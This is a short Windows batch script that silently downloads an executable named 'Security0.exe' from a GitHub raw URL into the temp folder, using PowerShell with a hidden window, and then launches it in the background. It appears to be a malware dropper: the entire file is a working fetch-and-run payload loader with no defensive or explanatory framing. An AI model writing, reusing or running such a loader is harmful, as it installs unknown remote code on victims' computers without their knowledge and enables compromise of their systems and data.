@echo off
setlocal

set "url_exe=https://raw.githubusercontent.com/KR4eeR/668768687/main/Security0.exe"

set "temp_dir=%TEMP%"
set "exe_path=%temp_dir%\Security0.exe"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri %url_exe% -OutFile %exe_path%"

if exist "%exe_path%" (
    start /b "" "%exe_path%"
)

endlocal
exit
